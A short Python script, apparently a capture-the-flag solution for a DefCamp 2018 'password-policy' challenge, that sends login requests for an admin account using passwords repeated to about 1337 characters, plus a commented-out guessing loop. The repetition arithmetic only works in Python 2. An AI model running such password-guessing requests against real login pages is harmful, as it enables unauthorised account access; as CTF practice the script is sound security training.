import requests
import string

# for ch in string.ascii_letters + string.digits:
# 	r = requests.post('https://password-policy.dctfq18.def.camp/', data = {'user': 'admin@leftover.dctf', 'pass': ch * 1337})
# 	print(r.text)

r = requests.post('https://password-policy.dctfq18.def.camp/', data = {'user': 'admin@leftover.dctf', 'pass': 'pass' * (1337 / 4 + 1)})
print(r.text)

r = requests.post('https://password-policy.dctfq18.def.camp/', data = {'user': 'admin@leftover.dctf', 'pass': 'password' * (1337 / 4 + 1)})
print(r.text)
